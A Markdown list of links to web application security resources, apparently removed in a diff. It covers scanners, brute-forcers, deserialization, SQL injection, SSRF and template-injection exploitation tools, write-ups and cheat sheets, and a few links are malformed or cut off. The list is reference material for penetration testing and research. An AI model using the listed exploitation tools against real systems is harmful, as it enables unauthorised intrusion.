-	* [Presentation](https://www.youtube.com/watch?v=J0otoKRh1Vk&app=desktop)
-* [The AppSec Starter Kit Timothy De Block](https://www.youtube.com/watch?v=KMz8lWNAUmg)
-* [Server-side browsing considered harmful](http://www.agarri.fr/docs/AppSecEU15-Server_side_browsing_considered_harmful.pdf)
-* [Backslash Powered Scanning: Hunting Unknown Vulnerability Classes](http://blog.portswigger.net/2016/11/backslash-powered-scanning-hunting.html)
-	*  Existing web scanners search for server-side injection vulnerabilities by throwing a canned list of technology-specific payloads at a target and looking for signatures - almost like an anti-virus. In this document, I'll share the conception and development of an alternative approach, capable of finding and confirming both known and unknown classes of injection vulnerabilities. Evolved from classic manual techniques, this approach reaps many of the benefits of manual testing including casual WAF evasion, a tiny network footprint, and flexibility in the face of input filtering.
-* [Web Application testing approach and cheating to win Jim McMurry Lee Neely Chelle Clements - Derbycon7](https://www.youtube.com/watch?v=Z8ZAv_EN-9M) 
-
-[DOM Based Angular Sandbox Escapes by Gareth Heyes - BSides Manchester2017](https://www.youtube.com/watch?v=jlSI5aVTEIg&index=16&list=PLcgqQkap1lNrOBNCXqpPqpPAqckxv0XhP)
-
-
-
-
-* [AWSBucketDump](https://github.com/jordanpotti/AWSBucketDump)
-	* Security Tool to Look For Interesting Files in S3 Buckets
-----------------
-### <a name="generalt">General Tools</a>
-General Tools
-* Site Imaging/Taking Pictures
-	* [PowerWebShot](https://github.com/dafthack/PowerWebShot)
-		* A PowerShell tool for taking screenshots of multiple web servers quickly.
-	* [HTTrack - Website Copier](https://www.httrack.com/)
-		* It allows you to download a World Wide Web site from the Internet to a local directory, building recursively all directories, getting HTML, images, and other files from the server to your computer. HTTrack arranges the original site's relative link-structure. Simply open a page of the "mirrored" website in your browser, and you can browse the site from link to link, as if you were viewing it online. HTTrack can also update an existing mirrored site, and resume interrupted downloads. HTTrack is fully configurable, and has an integrated help system. 
-	* [Kraken - Web Interface Survey Tool](https://github.com/Sw4mpf0x/Kraken)
-		* [Blogpost](https://pentestarmoury.com/2017/01/31/kraken-web-interface-survey-tool/)
-* General
-	* [HTTPie - curl for humans](https://gith*ub.com/jakubroztocil/httpie)
-		* HTTPie (pronounced aych-tee-tee-pie) is a command line HTTP client. Its goal is to make CLI interaction with web services as human-friendly as possible. It provides a simple http command that allows for sending arbitrary HTTP requests using a simple and natural syntax, and displays colorized output. HTTPie can be used for testing, debugging, and generally interacting with HTTP servers.
-	* [leaps - shared text editing in Golang](https://github.com/denji/leaps)
-		* Leaps is a service for hosting collaboratively edited documents using operational transforms to ensure zero-collision synchronization across any number of editing clients.
-	* [OWASP Mantra](http://www.getmantra.com/hackery/)
-		* “OWASP Mantra is a powerful set of tools to make the attacker's task easier”
-	* [dvcs-ripper](https://github.com/kost/dvcs-ripper)
-		* Rip web accessible (distributed) version control systems: SVN, GIT, Mercurial/hg, bzr, ... It can rip repositories even when directory browsing is turned off.
-	* [Caja](https://developers.google.com/caja/)
-		*  The Caja Compiler is a tool for making third party HTML, CSS and JavaScript safe to embed in your website. It enables rich interaction between the embedding page and the embedded applications. Caja uses an object-capability security model to allow for a wide range of flexible security policies, so that your website can effectively control what embedded third party code can do with user data.
-	* [Home-Assistant](https://home-assistant.io/)
-		* Open Source home automation platform
-	* [HTTPLeaks](https://github.com/cure53/HTTPLeaks)
-		* HTTPLeaks - All possible ways, a website can leak HTTP requests
-	* [SSleuth](https://github.com/sibiantony/ssleuth)
-		* A firefox add-on to rate the quality of HTTPS connections
-* JS-based scanning
-	* [lan-js](https://github.com/jvennix-r7/lan-js)
-		* Probe LAN devices from a web browser.
-	* [sonar.js](https://thehackerblog.com/sonar-a-framework-for-scanning-and-exploiting-internal-hosts-with-a-webpage/)
-		* A Framework for Scanning and Exploiting Internal Hosts With a Webpage
-* Recon
-	* [hackability](https://github.com/PortSwigger/hackability)
-		* Rendering Engine Hackability Probe performs a variety of tests to discover what the unknown rendering engine supports. To use it simply extract it to your web server and visit the url in the rendering engine you want to test. The more successful probes you get the more likely the target engine is vulnerable to attack.
-	* [WhatWeb](https://github.com/urbanadventurer/WhatWeb)
-	* [Tachyon](https://github.com/delvelabs/tachyon)
-		* Tachyon is a Fast Multi-Threaded Web Discovery Tool
-	* [dirsearch](https://github.com/maurosoria/dirsearch)
-		* dirsearch is a simple command line tool designed to brute force directories and files in websites.
-* Scanner
-	* General
-		* [HTCAP](https://github.com/segment-srl/htcap)
-			* htcap is a web application scanner able to crawl single page application (SPA) in a recursive manner by intercepting ajax calls and DOM changes
-		* [gethead](https://github.com/httphacker/gethead)
-			* HTTP Header Analysis Vulnerability Tool 
-	* Virtual Hosts/VHOSTs
-		* [virtual-host-discovery](https://github.com/jobertabma/virtual-host-discovery)
-			* This is a basic HTTP scanner that'll enumerate virtual hosts on a given IP address. During recon, this might help expand the target by detecting old or deprecated code. It may also reveal hidden hosts that are statically mapped in the developer's /etc/hosts file.
-	* Vulnerability
-
-
-
-
-
-
-
-
-
-
------------------------------
-## <a name="difatk">Different Types of Web Based Attacks</a>
-As seen on [OWASP Attack List](https://www.owasp.org/index.php/Category:Attack)
-
-
-
--------------------
-##### <a name="abuse"></a>Abuse of Functionality
-* [jsgifkeylogger](https://github.com/wopot/jsgifkeylogger)
-	* a javascript keylogger included in a gif file This is a PoC
-
-
-
-
--------------------
-### <a name="brute">Brute Force/Fuzzing</a>
-* [Dirbuster](https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)
-	* DirBuster is a multi threaded java application designed to brute force directories and files names on web/application servers. Often is the case now of what looks like a web server in a state of default installation is actually not, and has pages and applications hidden within. DirBuster attempts to find these.
-* [Go Buster](https://github.com/OJ/gobuster)
-	* Directory/file busting tool written in Go 
-	* Recursive, CLI-based, no java runtime
-* [WFuzz](https://code.google.com/p/wfuzz/)
-	* Wfuzz is a tool designed for bruteforcing Web Applications, it can be used for finding resources not linked (directories, servlets, scripts, etc), bruteforce GET and POST parameters for checking different kind of injections (SQL, XSS, LDAP,etc), bruteforce Forms parameters (User/Password), Fuzzing,etc
-* [dirsearch](https://github.com/maurosoria/dirsearch)
-	* dirsearch is a simple command line tool designed to brute force directories and files in websites.
-* [Tachyon](https://github.com/delvelabs/tachyon)
-		* Tachyon is a Fast Multi-Threaded Web Discovery Tool
-
-
-
-
-### Attacking Continous Integration Systems
-* [cider - Continuous Integration and Deployment Exploiter](https://github.com/spaceB0x/cider)
-	* CIDER is a framework written in node js that aims to harness the functions necessary for exploiting Continuous Integration (CI) systems and their related infrastructure and build chain (eg. Travis-CI, Drone, Circle-CI). Most of the exploits in CIDER exploit CI build systems through open GitHub repositories via malicious Pull Requests. It is built modularly to encourage contributions, so more exploits, attack surfaces, and build chain services will be integrated in the future.
-* [Rotten Apple](https://github.com/claudijd/rotten_apple)
-	* A tool for testing continuous integration (CI) or continuous delivery (CD) system security
-* [Exploiting Continuous Integration (CI) and Automated Build Systems - spaceb0x](https://media.defcon.org/DEF%20CON%2025/DEF%20CON%2025%20presentations/DEFCON-25-spaceB0x-Exploiting-Continuous-Integration.pdf)
-
-
--------------------
-#### <a name="csrf"></a>Cross Site Request Forgery (CSRF)
-* [Cross Site Request Forgery](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29)
-
-
-
-
-
--------------------
-#### <a name="encode">De/Encoders</a>
-De-/Encoders
-* [Unphp.net php decoder](http://www.unphp.net/decode/)
-* [Various forms of encoding/decoding web app](http://yehg.net/encoding/)
-* [Javascript De-Obfuscation Tools Redux](http://www.kahusecurity.com/2014/javascript-deobfuscation-tools-redux/)
-	* Back in 2011, I took a look at several tools used to deobfuscate Javascript. This time around I will use several popular automated and semi-automated/manual tools to see how they would fare against today’s obfuscated scripts with the least amount of intervention.	
-
-
-
--------------------
-#### <a name="dsa">Data Structure Attacks</a>
-Data Structure Attacks
-* --> See XML section
-* [Hunting in the Dark - Blind XXE](https://blog.zsec.uk/blind-xxe-learning/)
-* [Security Implications of DTD Attacks Against a Wide Range of XML Parsers](https://www.nds.rub.de/media/nds/arbeiten/2015/11/04/spaeth-dtd_attacks.pdf)
-* [Comma Separated Vulnerabilities](https://www.contextis.com/blog/comma-separated-vulnerabilities)
-
-
-
--------------------
-#### Electron
-Electron
-* Articles
-	* [From Markdown to RCE in Atom](https://statuscode.ch/2017/11/from-markdown-to-rce-in-atom/)
-* Documentation
-	* [Electron Documentation](https://electronjs.org/docs)
-	* [Security, Native Capabilities, and Your Responsibility - Electron Documentation](https://electron.atom.io/docs/tutorial/security/)
-* Talks
-	* [MarkDoom: How I Hacked Every Major IDE in 2 Weeks - Matt Austin, LevelUp 2017](https://www.youtube.com/watch?v=nnEnwJbiO-A)
-* [As It Stands - Electron Security - 2016](http://blog.scottlogic.com/2016/03/09/As-It-Stands-Electron-Security.html)
-* [As It Stands - Update on Electorn Security - 2016](http://blog.scottlogic.com/2016/06/01/An-update-on-Electron-Security.html)
-* [Modern Alchemy: Turning XSS into RCE](https://blog.doyensec.com/2017/08/03/electron-framework-security.html)
-[Electron - Build cross platform desktop XSS, it’s easier than you think by Yosuke Hasegawa - [CB16] ](https://www.youtube.com/watch?v=-j1DPPf9Z4U)
-* [Electronegativity - A Study of Electron Security - Carettoni](https://www.blackhat.com/docs/us-17/thursday/us-17-Carettoni-Electronegativity-A-Study-Of-Electron-Security.pdf)
-* [Build cross platform desktop XSS, it’s easier than you think by Yosuke Hasegawa - CodeBlue16](https://www.slideshare.net/codeblue_jp/cb16-hasegawa-en)
-* [Electron Security Checklist - A guide for developers and auditors - Luca Carettoni](https://www.blackhat.com/docs/us-17/thursday/us-17-Carettoni-Electronegativity-A-Study-Of-Electron-Security-wp.pdf)
-
-
-
-
--------------------
-#### <a name="emc">Embedded Malicious Code</a>
-
-
-
--------------------
-#### <a name="ear">Execution After(/Open) Redirect (EAR)
-Execution After Redirect/Open Redirect
-* Execution After Redirect
-	* [Execution After Redirect - OWASP](https://www.owasp.org/index.php/Execution_After_Redirect_(EAR))
-	* [Overview of Execution After Redirect Web Application Vulnerabilities](https://adamdoupe.com/blog/2011/04/20/overview-of-execution-after-redirect-web-application-vulnerabilities/)
-	* [EARs in the Wild: Large-Scale Analysis of Execution After Redirect Vulnerabilities](https://www.cs.ucsb.edu/~vigna/publications/2013_SAC_EARdetect.pdf)
-	* [Fear the EAR: Discovering and Mitigating Execution After Redirect Vulnerabilities](http://cs.ucsb.edu/~bboe/public/pubs/fear-the-ear-ccs2011.pdf)
-* Open Redirect
-	* [Open Redirect Payloads](https://github.com/cujanovic/Open-Redirect-Payloads)
-	* [Security and Open Redirects  Impact of 301-ing people in 2013](https://makensi.es/rvl/openredirs/#/)
-
-
--------------------
-#### <a name="eoa">Exploitation of Authentication</a>
-
-
-
--------------------
-#### <a name="ija">Injection Based Attacks</a>
-Injection Based Attacks
-* [Exploiting ShellShock getting a reverse shell](http://www.fantaghost.com/exploiting-shellshock-getting-reverse-shell)
-* [Exploiting Python Code Injection in Web Applications](https://sethsec.blogspot.com/2016/11/exploiting-python-code-injection-in-web.html)
-* [Popular Approaches to Preventing Code Injection Attacks are Dangerously Wrong - AppSecUSA 2017](https://www.youtube.com/watch?v=GjK0bB4K2zA&app=desktop)
-* See also: JNDI, JSON, SQLi, XSS
-
-
-
-
--------------------
-#### OS Command Injection
-Command Injection
-* General
-	* [Command Injection - OWASP](https://www.owasp.org/index.php/Command_Injection)
-* Testing
-	* [SHELLING](https://github.com/ewilded/shelling)
-		* A comprehensive OS command injection payload generator
-	* [Testing for Command Injection - OWASP](https://www.owasp.org/index.php/Testing_for_Command_Injection_(OTG-INPVAL-013))
-	* [How To: Command Injections - Hackerone](https://www.hackerone.com/blog/how-to-command-injections)
-	* [Data Exfiltration via Blind OS Command Injection](https://www.contextis.com/blog/data-exfiltration-via-blind-os-command-injection)
-* Tools
-	* [commix](https://github.com/stasinopoulos/commix)
-		* Automated All-in-One OS Command Injection and Exploitation Tool
-* Writeups
-
-
-
-
-
-
-
-
--------------------
-#### <a name="jndi"></a>JNDI Attack Class
-* General
-	* [What is JNDI ? What is its basic use..? When is it used? - StackOverflow](https://stackoverflow.com/questions/4365621/what-is-jndi-what-is-its-basic-use-when-is-it-used)
-	* [Introducing JNDI Injection and LDAP Entry Poisoning](https://community.softwaregrp.com/t5/Security-Research/Introducing-JNDI-Injection-and-LDAP-Entry-Poisoning/ba-p/219821)
-* Testing
-	* [jndipoc](https://github.com/zerothoughts/jndipoc)
-		* Proof of concept showing how java byte code can be injected through InitialContext.lookup() calls
-* Tools
-* Writeups
-	* [Java Naming and Directory Interface - Wikipedia](https://en.wikipedia.org/wiki/Java_Naming_and_Directory_Interface)
-	* [A Journey from JNDI-LDAP Manipulation to RCE](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf)
-	* [Video - A Journey From JNDI/LDAP Manipulation to Remote Code Execution Dream Land - BH USA16](https://www.youtube.com/watch?v=Y8a5nB-vy78)
-	* [Fun with JNDI remote code injection](http://zerothoughts.tumblr.com/post/137769010389/fun-with-jndi-remote-code-injection)
-
-
--------------------
-### <a name="jsa">De-/Serialization Attacks</a>
-De-/Serialization Attacks
-* General
-* Java
-	* [Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet)
-	* [Break Fast Serial](https://github.com/GoSecure/break-fast-serial)
-		* A proof of concept that demonstrates asynchronous scanning for Java deserialization bugs
-	* [SerialKiller: Bypass Gadget Collection](https://github.com/pwntester/SerialKillerBypassGadgetCollection)
-		* Collection of Bypass Gadgets that can be used in JVM Deserialization Gadget chains to bypass "Look-Ahead ObjectInputStreams" desfensive deserialization.
-	* [ysoserial](https://github.com/frohoff/ysoserial)
-	* [The perils of Java deserialization](https://community.hpe.com/t5/Security-Research/The-perils-of-Java-deserialization/ba-p/6838995)
-	* [Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet)
-		* A cheat sheet for pentesters about Java Native Binary Deserialization vulnerabilities
-	* [Java Unmarshaller Security - Turning your data into code execution](https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true)
-		* This paper presents an analysis, including exploitation details, of various Java open-source marshalling libraries that allow(ed) for unmarshalling of arbitrary, attacker supplied, types and shows that no matter how this process is performed and what implicit constraints are in place it is prone to similar exploitation techniques.
-		* tool from the above paper: [marshalsec](https://github.com/mbechler/marshalsec/)
-	* [Reliable discovery and Exploitation of Java Deserialization vulns](https://techblog.mediaservice.net/2017/05/reliable-discovery-and-exploitation-of-java-deserialization-vulnerabilities/)
-	* [Pwning Your Java Messaging With De- serialization Vulnerabilities](https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities-wp.pdf)
-	* [Java Deserialization Security FAQ](https://christian-schneider.net/JavaDeserializationSecurityFAQ.html)
-	* [The Perils of Java Deserialization](http://community.hpe.com/hpeb/attachments/hpeb/off-by-on-software-security-blog/722/1/HPE-SR%20whitepaper%20java%20deserialization%20RSA2016.pdf)
-	* [Detecting deserialization bugs with DNS exfiltration](http://gosecure.net/2017/03/22/detecting-deserialization-bugs-with-dns-exfiltration/)
-	* [JMET](https://github.com/matthiaskaiser/jmet)
-		* JMET was released at Blackhat USA 2016 and is an outcome of Code White's research effort presented in the talk "Pwning Your Java Messaging With Deserialization Vulnerabilities". The goal of JMET is to make the exploitation of the Java Message Service (JMS) easy. In the talk more than 12 JMS client implementations where shown, vulnerable to deserialization attacks. The specific deserialization vulnerabilities were found in ObjectMessage implementations (classes implementing javax.jms.ObjectMessage).
-	* [Serianalyzer](https://github.com/mbechler/serianalyzer)
-		* A static byte code analyzer for Java deserialization gadget research
-	* [Java Deserialization Exploits](https://github.com/CoalfireLabs/java_deserialization_exploits)
-		* A collection of Java Deserialization Exploits
-* Python
-	* [Exploiting Python Deserialization Vulnerabilities](https://crowdshield.com/blog.php?name=exploiting-python-deserialization-vulnerabilities)
-
-
-
-	
-
-
-
-
--------------------
-### <a name="jwt"></a>JSON Web Tokens
-JSON Web Tokens
-* 101
-	* [JSON Web Token - Wikipedia](https://en.wikipedia.org/wiki/JSON_Web_Token)
-	* [RFC 7159: JSON Web Token (JWT)](https://tools.ietf.org/html/rfc7519)
-	* [The Anatomy of a JSON Web Token](https://scotch.io/tutorials/the-anatomy-of-a-json-web-token)
-* General
-	* [Friday the 13th: JSON Attacks - Defcon25](https://media.defcon.org/DEF%20CON%2025/DEF%20CON%2025%20presentations/DEFCON-25-Alvaro-Munoz-JSON-attacks.pdf)
-	* [Critical vulnerabilities in JSON Web Token libraries - 2015](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/)
-* Testing
-	* [Attacking JWT authentication](https://www.sjoerdlangkemper.nl/2016/09/28/attacking-jwt-authentication/)
-* Tools
-	* [json token decode](http://jwt.calebb.net/)
-	* [JWT Inspector - FF plugin](https://www.jwtinspector.io/)
-		* JWT Inspector is a browser extension that lets you decode and inspect JSON Web Tokens in requests, cookies, and local storage. Also debug any JWT directly from the console or in the built-in UI.
-* Writeups
-	* [How to configure Json.NET to create a vulnerable web API - alphabot](https://www.alphabot.com/security/blog/2017/net/How-to-configure-Json.NET-to-create-a-vulnerable-web-API.html)
-	* [?? Learn how to use JSON Web Token (JWT) to secure your next Web App! (Tutorial/Example with Tests!!)](https://github.com/dwyl/learn-json-web-tokens)
-
-
-
-
--------------------
-### <a name="lrfi">LFI & RFI</a>
-Local/Remote File Inclusion
-* 101
-	* [File inclusion vulnerability - Wikipedia](https://en.wikipedia.org/wiki/File_inclusion_vulnerability)
-* General
-* Testing
-	* [Unrestricted File Upload Testing](https://www.aptive.co.uk/blog/unrestricted-file-upload-testing/)
-	* [LFI Local File Inclusion Techniques (paper)](http://www.ush.it/2008/08/18/lfi2rce-local-file-inclusion-to-remote-code-execution-advanced-exploitation-proc-shortcuts/)
-		* This paper exposes the ability from the attacker standpoint to use /proc in order to exploit LFI (Local File Inclusion) vulnerabilities. While using /proc for such aim is well known this one is a specific technique that was not been previously published as far as we know. A tool to automatically exploit LFI using the shown approach is released accordingly. 
-	* [Update: a third (known) technique has been dissected here](http://www_ush_it/2008/07/09/local-file-inclusion-lfi-of-session-files-to-root-escalation/ ) 
-	* [psychoPATH - LFI](https://github.com/ewilded/psychoPATH/blob/master/README.md)
-		* This tool is a highly configurable payload generator detecting LFI & web root file uploads. Involves advanced path traversal evasive techniques, dynamic web root list generation, output encoding, site map-searching payload generator, LFI mode, nix & windows support plus single byte generator.
-* Tools
-	* [Liffy](https://github.com/rotlogix/liffy)
-		* Liffy is a Local File Inclusion Exploitation tool. 
-* Writeups
-	* [Turning LFI into RFI](https://l.avala.mp/?p=241)
-		* When configured in a specific way the web application would load the JAR file and search within the file for a class. Interestingly enough, in Java classes you can define a static block that is executed upon the class being processed
-
-
-
-
-
-
--------------------
-### NodeJS
-NodeJS
-* General	
-	* [Reverse shell on a Node.js application](https://wiremask.eu/writeups/reverse-shell-on-a-nodejs-application/)
-	* [NodeJS: Remote Code Execution as a Service - Peabnuts123 – Kiwicon 2016](https://www.youtube.com/watch?v=Qvtfagwlfwg)
-		* [SLIDES](http://archivedchaos.com/post/153372061089/kiwicon-2016-slides-upload)
-* Tools	
-	* [faker.js](https://github.com/Marak/faker.js)
-		* generate massive amounts of fake data in Node.js and the browser
-
--------------------
-### <a name="sql"></a>(No)SQL Injection
-(No-)SQL Injection
-* 101
-* General
-	* [SQL Injection wiki](http://www.sqlinjectionwiki.com/)
-* Reference
-	* [SQL Injection Knowledge Base](http://websec.ca/kb/sql_injection#MySQL_Testing_Injection)
-	* [SQL Injection Cheat Sheet](http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/)
-	* [SQL Injection Cheat Sheet - NetSparker](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)
-* Testing
-	* [Laduanum](http://laudanum.sourceforge.net/)
-		* “Laudanum is a collection of injectable files, designed to be used in a pentest when SQL injection flaws are found and are in multiple languages for different environments.They provide functionality such as shell, DNS query, LDAP retrieval and others.”
-* Tools
-	* [sqlmap](https://github.com/sqlmapproject/sqlmap)
-	* [jSQL Injection](https://github.com/ron190/jsql-injection)
-		* jSQL Injection is a Java application for automatic SQL database injection.
-	* [mongoaudit](https://github.com/stampery/mongoaudit)
-* Training
-	* [SQLi Lab lessons](https://github.com/Audi-1/sqli-labs)
-		* SQLI-LABS is a platform to learn SQLI
-* Writeups
-	* [Use google bots to perform SQL injections on websites](http://blog.sucuri.net/2013/11/google-bots-doing-sql-injection-attacks.html)
-	* [Performing sqlmap POST request injection](https://hackertarget.com/sqlmap-post-request-injection/)
-* DB2
-	* [DB2 SQL injection cheat sheet](https://securityetalii.es/2012/05/20/db2-sql-injection-cheat-sheet/)
-* MS-SQL
-	* [Pen test and hack microsoft sql server (mssql)](http://travisaltman.com/pen-test-and-hack-microsoft-sql-server-mssql/)
-* MySQL
-* NoSQL
-	* [Nosql-Exploitation-Framework](https://github.com/torque59/Nosql-Exploitation-Framework)
-		* A FrameWork For NoSQL Scanning and Exploitation Framework
-	* [Making Mongo Cry Attacking NoSQL for Pen Testers Russell Butturini](https://www.youtube.com/watch?v=NgsesuLpyOg)
-	* [MongoDB: Typical Security Weaknesses in a NoSQL DB](http://blog.spiderlabs.com/2013/03/mongodb-security-weaknesses-in-a-typical-nosql-database.html)
-	* [MongoDB Pentesting for Absolute Beginners](https://github.com/nixawk/pentest-wiki/blob/master/2.Vulnerability-Assessment/Database-Assessment/mongodb/MongoDB%20Pentesting%20for%20Absolute%20Beginners.pdf)
-* PostgreSQL
-	* [PostgreSQL Pass The Hash protocol design weakness](https://hashcat.net/misc/postgres-pth/postgres-pth.pdf)
-* Oracle SQL
-	* [Oracle SQL Injection Guides & Whitepapers](https://haiderm.com/oracle-sql-injection-guides-and-whitepapers/)
-
-
-
-
-
-
--------------------
-### <a name="pta">Path Traversal Attacks</a>
-Path Traversal
-* [Exploiting PHP File Inclusion – Overview](https://websec.wordpress.com/2010/02/22/exploiting-php-file-inclusion-overview/)
-* [dotdotpwn](https://github.com/wireghoul/dotdotpwn)
-	* It's a very flexible intelligent fuzzer to discover traversal directory vulnerabilities in software such as HTTP/FTP/TFTP servers, Web platforms such as CMSs, ERPs, Blogs, etc.
-
-
-
--------------
-### <a name="ssrf"></a>Server Side Request Forgery (SSRF)
-Server Side Request Forger (SSRF)
-* 101
-	* [CWE-918: Server-Side Request Forgery (SSRF)](https://cwe.mitre.org/data/definitions/918.html)
-	* [What is Server Side Request Forgery (SSRF)?](https://www.acunetix.com/blog/articles/server-side-request-forgery-vulnerability/)
-	* [What is the Server Side Request Forgery Vulnerability & How to Prevent It? - netsparker](https://www.netsparker.com/blog/web-security/server-side-request-forgery-vulnerability-ssrf/)
-	* [Vulnerable by Design: Understanding Server-Side Request Forgery - BishopFox](https://www.bishopfox.com/blog/2015/04/vulnerable-by-design-understanding-server-side-request-forgery/)
-* General
-
-	* [A New Era of SSRF  - Exploiting URL Parser in  Trending Programming Languages](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf)
-* Writeups
-	* [SSRF VS BUSINESS-CRITICAL APPLICATIONS PART 1: XXE TUNNELING IN SAP NET WEAVER - erpscan](https://erpscan.com/wp-content/uploads/publications/SSRF-vs-Businness-critical-applications-final-edit.pdf)
-	* [A New Era of SSRF  - Exploiting URL Parser in  Trending Programming Languages! - Orange Tsai - BH USA 17](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf)
-	* [curl Based SSRF Exploits Against Redis](https://maxchadwick.xyz/blog/ssrf-exploits-against-redis)
-	* [Pivoting from blind SSRF to RCE with HashiCorp Consul](http://www.kernelpicnic.net/2017/05/29/Pivoting-from-blind-SSRF-to-RCE-with-Hashicorp-Consul.html)
-	* [ How I Chained 4 vulnerabilities on GitHub Enterprise, From SSRF Execution Chain to RCE!](http://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html)
-	* [Airbnb – Chaining Third-Party Open Redirect into Server-Side Request Forgery (SSRF) via LivePerson Chat](https://buer.haus/2017/03/09/airbnb-chaining-third-party-open-redirect-into-server-side-request-forgery-ssrf-via-liveperson-chat/)
-* Testing/Tools
-	* [SSRF bible. Cheatsheet](https://docs.google.com/document/d/1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM/edit#heading=h.t4tsk5ixehdd)	
-	* [SSRF (Server Side Request Forgery) testing resources](https://github.com/cujanovic/SSRF-Testing/)	
-	* [How To: Server-Side Request Forgery (SSRF)](https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF)
-	* [Port scanning with Server Side Request Forgery (SSRF) - acunetix](https://www.acunetix.com/blog/articles/ssrf-vulnerability-used-to-scan-the-web-servers-network/)
-
-
-
-
-
-
-
--------------------
-### <a name="ssi"></a>Server Side Include
-Server Side Include
-* General
-	* [Server Side Includes - Wikipedia](https://en.wikipedia.org/wiki/Server_Side_Includes)
-	* [Server-Side Includes (SSI) Injection - OWASP](https://www.owasp.org/index.php/Server-Side_Includes_(SSI)_Injection)
-* Testing
-	* [Testing for SSI Injection (OTG-INPVAL-009) - OWASP](https://www.owasp.org/index.php/Testing_for_SSI_Injection_(OTG-INPVAL-009))
-
--------------------
-### <a name="ssti">Server Side Template Injection</a>
-Server Side Template Injection
-* General
-	* [Server-Side Template Injection: RCE for the modern webapp](https://portswigger.net/knowledgebase/papers/ServerSideTemplateInjection.pdf)
-	* [Server-Side Template Injection](http://blog.portswigger.net/2015/08/server-side-template-injection.html)
-		* [Video](https://www.youtube.com/watch?v=3cT0uE7Y87s)
-		* This paper defines a methodology for detecting and exploiting template injection, and shows it being applied to craft RCE zerodays for two widely deployed enterprise web applications. Generic exploits are demonstrated for five of the most popular template engines, including escapes from sandboxes whose entire purpose is to handle user-supplied templates in a safe way.
-* Writeups
-	* [Exploring SSTI in Flask/Jinja2](https://nvisium.com/blog/2016/03/09/exploring-ssti-in-flask-jinja2/)
-	* [Ruby ERB Template Injection](https://www.trustedsec.com/2017/09/rubyerb-template-injection/)
-	* [Remote Code Execution via Server Side Template Injection at OFBiz 13.07.03 (CVE-2016-4462)](https://insinuator.net/2016/07/dilligent-bug/)
-	* [Injecting Flask - Nvisium](https://nvisium.com/blog/2015/12/07/injecting-flask/)
-* Tools
-	* [tplmap](https://github.com/epinna/tplmap)
-		* Code and Server-Side Template Injection Detection and Exploitation Tool
-	* [Templates Injections - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20injections)
-
-----------------
-### <a name="subres"></a>Subresource Integrity
-Subresource Integrity
-* General
-	* [Subresource Integrity - W3C](https://www.w3.org/TR/SRI/)
-	* [Subresource Integrity - Mozilla](https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity)
-	* [Subresource Integrity (SRI) for Validating Web Resources Hosted on Third Party Services (CDNs) - Netsparker](https://www.netsparker.com/blog/web-security/subresource-integrity-SRI-security/)
-	* [SRI Hash Generator](https://www.srihash.org/)
-
-----------------
-### <a name="swf"></a>SWF
-Flash/SWF
-* General
-	* [The old is new, again. CVE-2011-2461 is back!](https://www.slideshare.net/ikkisoft/the-old-is-new-again-cve20112461-is-back)
-		* As a part of an ongoing investigation on Adobe Flash SOP bypass techniques, we identified a vulnerability affecting old releases of the Adobe Flex SDK compiler. Further investigation traced the issue back to a well known vulnerability (CVE20112461), already patched by Adobe. Old vulnerability, let's move on? Not this time. CVE20112461 is a very interesting bug. As long as the SWF file was compiled with a vulnerable Flex SDK, attackers can still use this vulnerability against the latest web browsers and Flash plugin. Even with the most recent updates, vulnerable Flex applications hosted on your domain can be exploited. In this presentation, we will disclose the details of this vulnerability (Adobe has never released all technicalities) and we will discuss how we conducted a large scale analysis on popular websites, resulting in the identification of numerous Alexa Top 50 sites vulnerable to this bug. Finally, we will also release a custom tool and a Burp plugin capable of detecting vulnerable SWF applications. 
-	* Advanced Flash Vulnerabilities in Youtube Writeups Series
-		* [Advanced Flash Vulnerabilities in Youtube – Part 1](https://opnsec.com/2017/08/advanced-flash-vulnerabilities-in-youtube-part-1/)
-		* [Advanced Flash Vulnerabilities in Youtube – Part 2](https://opnsec.com/2017/08/advanced-flash-vulnerabilities-in-youtube-part-2/)
-		* [Advanced Flash Vulnerabilities in Youtube – Part 3](https://opnsec.com/2017/08/advanced-flash-vulnerabilities-in-youtube-part-3/)
-	* [Decode Adobe Flex AMF protocol](http://blog.dornea.nu/2015/06/22/decode-adobe-flex-amf-protocol/)
-* Securing
-	* [HardenFlash](https://github.com/HaifeiLi/HardenFlash)
-		* Patching Flash binary to stop Flash exploits and zero-days
-* Tools
-	* [ParrotNG](https://github.com/ikkisoft/ParrotNG/releases)
-		* ParrotNG is a Java-based tool for automatically identifying vulnerable SWF files, built on top of swfdump. One JAR, two flavors: command line tool and Burp Pro Passive Scanner Plugin.
-	[deblaze](http://blog.dornea.nu/2015/06/22/decode-adobe-flex-amf-protocol/)
-		* Performs method enumeration and interrogation against flash remoting end points.
-
-
-
-
-
-
-
-
-
--------------------
-### <a name="timing"></a>Timing Attacks
-Timing Attacks
-* [Timing attack - Wikipedia](https://en.wikipedia.org/wiki/Timing_attack)
-* [Race conditions on the web ](https://www.josipfranjkovic.com/blog/race-conditions-on-web)
-* [Practical Race Condition Vulnerabilities in Web Applications](https://de
-* [Race The Web (RTW)](https://github.com/insp3ctre/race-the-web)
